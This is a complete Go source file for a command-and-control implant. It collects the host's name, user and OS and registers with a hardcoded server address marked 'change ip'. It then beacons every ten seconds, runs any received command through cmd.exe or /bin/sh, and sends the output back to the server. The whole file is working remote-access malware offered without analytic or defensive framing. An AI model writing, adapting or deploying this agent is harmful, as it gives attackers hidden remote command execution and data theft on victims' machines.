package main
import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)
const (
    C2Server       = "http://10.54.50.172:5000" // change ip
    BeaconInterval = 10 * time.Second
)
type SystemInfo struct {
    Hostname string `json:"hostname"`
    Username string `json:"username"`
    OS       string `json:"os"`
}
type Task struct {
    ID      int    `json:"id"`
    Command string `json:"command"`
}
type Result struct {
    AgentID string `json:"agent_id"`
    TaskID  int    `json:"task_id"`
    Output  string `json:"output"`
}
func GetSystemInfo() SystemInfo {
    hostname, _ := os.Hostname()
    currentUser, _ := user.Current()
    username := currentUser.Username
    osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
    return SystemInfo{
        Hostname: hostname,
        Username: username,
        OS:       osInfo,
    }
}
func RegisterAgent() (string, error) {
    sysInfo := GetSystemInfo()
    jsonData, _ := json.Marshal(sysInfo)
    resp, err := http.Post(
        C2Server+"/register",
        "application/json",
        bytes.NewBuffer(jsonData),
    )
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()
    var result map[string]interface{}
    json.NewDecoder(resp.Body).Decode(&result)
    agentID := result["agent_id"].(string)
    return agentID, nil
}
func GetTasks(agentID string) ([]Task, error) {
    resp, err := http.Get(C2Server + "/tasks/" + agentID)
    
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    
    var result struct {
        Tasks []Task `json:"tasks"`
    }
    
    json.NewDecoder(resp.Body).Decode(&result)
    
    return result.Tasks, nil
}

// ExecuteCommand executes shell command
func ExecuteCommand(command string) string {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    
    output, err := cmd.CombinedOutput()
    
    if err != nil {
        return fmt.Sprintf("Error: %s\n%s", err.Error(), string(output))
    }
    return string(output)
}
func SendResult(agentID string, taskID int, output string) error {
    result := Result{
        AgentID: agentID,
        TaskID:  taskID,
        Output:  output,
    }
    
    jsonData, _ := json.Marshal(result)
    
    _, err := http.Post(
        C2Server+"/results",
        "application/json",
        bytes.NewBuffer(jsonData),
    )
    return err
}
func main() {
    agentID, err := RegisterAgent()
    if err != nil {
        fmt.Println("Registration failed:", err)
        time.Sleep(60 * time.Second)
        os.Exit(1)
    }
    fmt.Printf("Registered: %s\n", agentID)
    for {
        tasks, err := GetTasks(agentID)
        if err == nil {
            for _, task := range tasks {
                fmt.Printf("Executing: %s\n", task.Command)
                output := ExecuteCommand(task.Command)
                SendResult(agentID, task.ID, output)
                fmt.Printf("Result sent for task %d\n", task.ID)
            }
        }
        time.Sleep(BeaconInterval)
    }
}